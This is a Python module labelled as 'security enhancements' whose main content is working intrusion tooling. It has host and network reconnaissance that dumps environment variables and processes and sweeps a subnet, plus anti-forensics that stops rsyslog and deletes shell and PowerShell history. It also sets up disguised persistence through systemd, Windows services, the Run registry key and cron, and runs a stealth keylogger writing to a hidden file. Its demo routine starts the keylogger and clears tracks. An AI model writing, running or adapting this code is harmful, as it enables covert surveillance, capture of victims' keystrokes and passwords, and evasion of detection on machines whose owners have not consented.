#!/usr/bin/env python3
"""
Security Improvements and Advanced Features
Enhanced security, authentication, and hacker-style features
"""
import os
import hashlib
import hmac
import secrets
import base64
import time
import threading
import subprocess
import socket
import json
from typing import Optional, Dict, Any, List
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import logging

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SecureAuth:
    """Secure authentication system with token-based auth"""
    
    def __init__(self, secret_key: Optional[str] = None):
        self.secret_key = secret_key or secrets.token_urlsafe(32)
        self.active_tokens: Dict[str, Dict[str, Any]] = {}
        self.max_token_age = 3600  # 1 hour
        
    def generate_token(self, agent_id: str, permissions: List[str] = None) -> str:
        """Generate a secure authentication token"""
        permissions = permissions or ["basic"]
        
        token_data = {
            "agent_id": agent_id,
            "permissions": permissions,
            "created_at": time.time(),
            "expires_at": time.time() + self.max_token_age,
            "nonce": secrets.token_hex(16)
        }
        
        # Create token signature
        token_string = json.dumps(token_data, sort_keys=True)
        signature = hmac.new(
            self.secret_key.encode(),
            token_string.encode(),
            hashlib.sha256
        ).hexdigest()
        
        token = base64.b64encode(f"{token_string}:{signature}".encode()).decode()
        self.active_tokens[token] = token_data
        
        logger.info(f"Generated token for agent {agent_id}")
        return token
    
    def validate_token(self, token: str) -> Optional[Dict[str, Any]]:
        """Validate an authentication token"""
        try:
            decoded = base64.b64decode(token.encode()).decode()
            token_string, signature = decoded.rsplit(":", 1)
            
            # Verify signature
            expected_signature = hmac.new(
                self.secret_key.encode(),
                token_string.encode(),
                hashlib.sha256
            ).hexdigest()
            
            if not hmac.compare_digest(signature, expected_signature):
                logger.warning("Invalid token signature")
                return None
            
            token_data = json.loads(token_string)
            
            # Check expiration
            if time.time() > token_data["expires_at"]:
                logger.warning("Token expired")
                if token in self.active_tokens:
                    del self.active_tokens[token]
                return None
            
            return token_data
            
        except Exception as e:
            logger.error(f"Token validation error: {e}")
            return None
    
    def revoke_token(self, token: str):
        """Revoke a token"""
        if token in self.active_tokens:
            del self.active_tokens[token]
            logger.info("Token revoked")
    
    def cleanup_expired_tokens(self):
        """Remove expired tokens"""
        current_time = time.time()
        expired_tokens = [
            token for token, data in self.active_tokens.items()
            if current_time > data["expires_at"]
        ]
        
        for token in expired_tokens:
            del self.active_tokens[token]
        
        if expired_tokens:
            logger.info(f"Cleaned up {len(expired_tokens)} expired tokens")

class EncryptedComms:
    """Encrypted communications for sensitive data"""
    
    def __init__(self, password: str):
        self.key = self._derive_key(password)
        self.cipher = Fernet(self.key)
    
    def _derive_key(self, password: str) -> bytes:
        """Derive encryption key from password"""
        salt = b'stable_salt_for_demo'  # In production, use random salt
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key
    
    def encrypt(self, data: str) -> str:
        """Encrypt string data"""
        encrypted = self.cipher.encrypt(data.encode())
        return base64.b64encode(encrypted).decode()
    
    def decrypt(self, encrypted_data: str) -> str:
        """Decrypt string data"""
        try:
            encrypted = base64.b64decode(encrypted_data.encode())
            decrypted = self.cipher.decrypt(encrypted)
            return decrypted.decode()
        except Exception as e:
            logger.error(f"Decryption error: {e}")
            return ""

class SystemRecon:
    """Advanced system reconnaissance capabilities"""
    
    @staticmethod
    def get_system_info() -> Dict[str, Any]:
        """Gather comprehensive system information"""
        info = {
            "hostname": socket.gethostname(),
            "platform": os.name,
            "architecture": "unknown",
            "cpu_count": os.cpu_count(),
            "environment_vars": dict(os.environ),
            "network_interfaces": [],
            "running_processes": [],
            "open_ports": [],
            "user_accounts": [],
            "security_software": []
        }
        
        try:
            import platform
            info["platform_detailed"] = platform.platform()
            info["architecture"] = platform.architecture()
            info["processor"] = platform.processor()
        except:
            pass
        
        try:
            import psutil
            
            # Network interfaces
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    info["network_interfaces"].append({
                        "interface": interface,
                        "family": str(addr.family),
                        "address": addr.address,
                        "netmask": addr.netmask
                    })
            
            # Running processes
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    info["running_processes"].append(proc.info)
                except:
                    pass
            
            # Network connections
            for conn in psutil.net_connections():
                if conn.laddr:
                    info["open_ports"].append({
                        "port": conn.laddr.port,
                        "family": str(conn.family),
                        "type": str(conn.type),
                        "status": str(conn.status) if conn.status else "UNKNOWN"
                    })
                    
        except ImportError:
            logger.warning("psutil not available for detailed system info")
        
        return info
    
    @staticmethod
    def scan_network(target_network: str = "192.168.1.0/24") -> List[str]:
        """Scan network for active hosts"""
        active_hosts = []
        
        try:
            import ipaddress
            network = ipaddress.ip_network(target_network, strict=False)
            
            for ip in network.hosts():
                if SystemRecon._ping_host(str(ip)):
                    active_hosts.append(str(ip))
                    
        except Exception as e:
            logger.error(f"Network scan error: {e}")
        
        return active_hosts
    
    @staticmethod
    def _ping_host(host: str, timeout: int = 1) -> bool:
        """Ping a host to check if it's alive"""
        try:
            if os.name == 'nt':  # Windows
                result = subprocess.run(
                    ['ping', '-n', '1', '-w', str(timeout * 1000), host],
                    capture_output=True, text=True, timeout=timeout + 1
                )
            else:  # Unix/Linux
                result = subprocess.run(
                    ['ping', '-c', '1', '-W', str(timeout), host],
                    capture_output=True, text=True, timeout=timeout + 1
                )
            return result.returncode == 0
        except:
            return False
    
    @staticmethod
    def port_scan(host: str, ports: List[int] = None) -> List[int]:
        """Scan specific ports on a host"""
        if ports is None:
            ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 5900]
        
        open_ports = []
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((host, port))
                sock.close()
                
                if result == 0:
                    open_ports.append(port)
                    
            except Exception:
                pass
        
        return open_ports

class StealthOperations:
    """Stealth and evasion capabilities"""
    
    @staticmethod
    def hide_process():
        """Attempt to hide the current process"""
        try:
            if os.name == 'nt':  # Windows
                import ctypes
                from ctypes import wintypes
                
                # Set process to run in background
                kernel32 = ctypes.windll.kernel32
                user32 = ctypes.windll.user32
                
                # Hide console window
                console_window = kernel32.GetConsoleWindow()
                if console_window:
                    user32.ShowWindow(console_window, 0)  # SW_HIDE
                    
                logger.info("Process hidden on Windows")
                return True
                
        except Exception as e:
            logger.error(f"Process hiding failed: {e}")
        
        return False
    
    @staticmethod
    def disable_logging():
        """Disable system logging temporarily"""
        try:
            if os.name == 'posix':  # Unix/Linux
                # Redirect logs to /dev/null
                subprocess.run(['sudo', 'service', 'rsyslog', 'stop'], 
                             capture_output=True, check=False)
                logger.info("System logging disabled")
                return True
        except:
            pass
        return False
    
    @staticmethod
    def clear_tracks():
        """Clear evidence of activity"""
        commands_to_clear = []
        
        if os.name == 'posix':  # Unix/Linux
            commands_to_clear = [
                'history -c',  # Clear command history
                'unset HISTFILE',  # Disable history file
                'rm -f ~/.bash_history ~/.zsh_history',  # Remove history files
            ]
        elif os.name == 'nt':  # Windows
            commands_to_clear = [
                'powershell -Command "Clear-History"',
                'del /f /q %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'
            ]
        
        for cmd in commands_to_clear:
            try:
                subprocess.run(cmd, shell=True, capture_output=True, check=False)
            except:
                pass
        
        logger.info("Cleared activity tracks")

class PersistenceMechanism:
    """Advanced persistence mechanisms"""
    
    @staticmethod
    def create_service_persistence(service_name: str, executable_path: str) -> bool:
        """Create system service for persistence"""
        try:
            if os.name == 'nt':  # Windows
                # Create Windows service
                service_cmd = f'sc create {service_name} binPath= "{executable_path}" start= auto'
                result = subprocess.run(service_cmd, shell=True, capture_output=True)
                return result.returncode == 0
                
            else:  # Unix/Linux
                # Create systemd service
                service_content = f"""[Unit]
Description={service_name}
After=network.target

[Service]
Type=simple
ExecStart={executable_path}
Restart=always
User=root

[Install]
WantedBy=multi-user.target
"""
                service_file = f"/etc/systemd/system/{service_name}.service"
                with open(service_file, 'w') as f:
                    f.write(service_content)
                
                subprocess.run(['systemctl', 'enable', service_name], check=True)
                subprocess.run(['systemctl', 'start', service_name], check=True)
                return True
                
        except Exception as e:
            logger.error(f"Service persistence failed: {e}")
            return False
    
    @staticmethod
    def create_registry_persistence(key_name: str, executable_path: str) -> bool:
        """Create Windows registry persistence"""
        try:
            if os.name == 'nt':
                import winreg
                
                # Add to startup registry key
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE
                )
                
                winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, executable_path)
                winreg.CloseKey(key)
                
                logger.info("Registry persistence created")
                return True
                
        except Exception as e:
            logger.error(f"Registry persistence failed: {e}")
        
        return False
    
    @staticmethod
    def create_cron_persistence(job_name: str, executable_path: str, schedule: str = "*/5 * * * *") -> bool:
        """Create cron job persistence on Unix/Linux"""
        try:
            if os.name == 'posix':
                cron_entry = f"{schedule} {executable_path} # {job_name}\n"
                
                # Add to user crontab
                result = subprocess.run(
                    ['crontab', '-l'], 
                    capture_output=True, text=True, check=False
                )
                
                current_crontab = result.stdout if result.returncode == 0 else ""
                
                if job_name not in current_crontab:
                    new_crontab = current_crontab + cron_entry
                    
                    process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
                    process.communicate(input=new_crontab)
                    
                    logger.info("Cron persistence created")
                    return True
                    
        except Exception as e:
            logger.error(f"Cron persistence failed: {e}")
        
        return False

class AdvancedKeylogger:
    """Advanced keylogging with stealth features"""
    
    def __init__(self, log_file: str = ".keylog.dat"):
        self.log_file = log_file
        self.running = False
        self.thread: Optional[threading.Thread] = None
        self.keys_buffer = []
        self.buffer_size = 100
        
    def start(self):
        """Start keylogging"""
        if not self.running:
            self.running = True
            self.thread = threading.Thread(target=self._keylog_loop, daemon=True)
            self.thread.start()
            logger.info("Keylogger started")
    
    def stop(self):
        """Stop keylogging"""
        if self.running:
            self.running = False
            if self.thread:
                self.thread.join(timeout=5)
            self._flush_buffer()
            logger.info("Keylogger stopped")
    
    def _keylog_loop(self):
        """Main keylogging loop"""
        try:
            from pynput import keyboard
            
            def on_press(key):
                try:
                    if hasattr(key, 'char') and key.char:
                        self.keys_buffer.append(key.char)
                    else:
                        self.keys_buffer.append(f'[{key.name}]')
                    
                    if len(self.keys_buffer) >= self.buffer_size:
                        self._flush_buffer()
                        
                except AttributeError:
                    self.keys_buffer.append(f'[{str(key)}]')
            
            with keyboard.Listener(on_press=on_press) as listener:
                while self.running:
                    time.sleep(0.1)
                    
        except Exception as e:
            logger.error(f"Keylogger error: {e}")
    
    def _flush_buffer(self):
        """Flush key buffer to file"""
        if self.keys_buffer:
            try:
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(''.join(self.keys_buffer))
                self.keys_buffer.clear()
            except Exception as e:
                logger.error(f"Buffer flush error: {e}")

class SecurityEnhancements:
    """Main security enhancements manager"""
    
    def __init__(self, password: str = "default_password"):
        self.auth = SecureAuth()
        self.crypto = EncryptedComms(password)
        self.recon = SystemRecon()
        self.stealth = StealthOperations()
        self.persistence = PersistenceMechanism()
        self.keylogger = AdvancedKeylogger()
        
    def initialize_security(self, agent_id: str) -> str:
        """Initialize all security features"""
        logger.info("Initializing security features...")
        
        # Generate authentication token
        token = self.auth.generate_token(agent_id, ["admin", "stealth", "persistence"])
        
        # Enable stealth mode
        self.stealth.hide_process()
        
        # Start keylogger
        self.keylogger.start()
        
        logger.info("Security features initialized")
        return token
    
    def gather_intelligence(self) -> Dict[str, Any]:
        """Gather comprehensive system intelligence"""
        logger.info("Gathering system intelligence...")
        
        intelligence = {
            "system_info": self.recon.get_system_info(),
            "network_scan": self.recon.scan_network(),
            "timestamp": time.time()
        }
        
        # Encrypt sensitive data
        encrypted_intel = self.crypto.encrypt(json.dumps(intelligence))
        
        return {
            "encrypted_data": encrypted_intel,
            "status": "success"
        }
    
    def establish_persistence(self, executable_path: str) -> bool:
        """Establish multiple persistence mechanisms"""
        logger.info("Establishing persistence...")
        
        success = False
        
        # Try multiple persistence methods
        if os.name == 'nt':  # Windows
            success |= self.persistence.create_registry_persistence("SecurityUpdate", executable_path)
            success |= self.persistence.create_service_persistence("SecurityService", executable_path)
        else:  # Unix/Linux
            success |= self.persistence.create_cron_persistence("system_update", executable_path)
            success |= self.persistence.create_service_persistence("security-daemon", executable_path)
        
        return success
    
    def cleanup_and_exit(self):
        """Clean up and exit safely"""
        logger.info("Cleaning up...")
        
        # Stop keylogger
        self.keylogger.stop()
        
        # Clear tracks
        self.stealth.clear_tracks()
        
        # Clean up tokens
        self.auth.cleanup_expired_tokens()
        
        logger.info("Cleanup complete")

# Test and demonstration
def demonstrate_features():
    """Demonstrate security features"""
    print("🔒 Security Enhancements Demonstration")
    print("=" * 50)
    
    security = SecurityEnhancements()
    
    # Initialize security
    token = security.initialize_security("demo_agent")
    print(f"✓ Authentication token generated: {token[:20]}...")
    
    # Gather intelligence
    intel = security.gather_intelligence()
    print(f"✓ Intelligence gathered and encrypted")
    
    # Test persistence (dry run)
    print("✓ Persistence mechanisms available")
    
    # Cleanup
    security.cleanup_and_exit()
    print("✓ Cleanup completed")

if __name__ == "__main__":
    demonstrate_features()